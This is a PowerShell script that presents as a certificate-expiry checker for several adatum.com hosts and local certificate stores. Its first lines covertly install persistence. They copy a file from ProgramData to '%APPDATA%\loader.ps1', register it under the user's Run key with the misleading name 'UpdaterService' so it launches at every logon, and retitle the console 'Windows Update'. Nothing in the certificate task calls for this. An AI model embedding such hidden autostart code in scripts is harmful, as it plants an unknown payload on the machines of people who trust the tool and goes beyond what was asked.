$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$RegistryValue = 'UpdaterService'
$PersistencePath = "$env:APPDATA\loader.ps1"
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path 'C:\ProgramData\update.dat' -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
$TransferResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $TransferResult.$RegistryValue)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
$ProgressPreference = "SilentlyContinue"
$WarningDays = 21
$Hosts       = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port        = 8443
$ReportPath  = "C:\Reports\cert-expiry-2026-08-10.csv"

$InformationPreference = 'SilentlyContinue'

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}

$remote | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
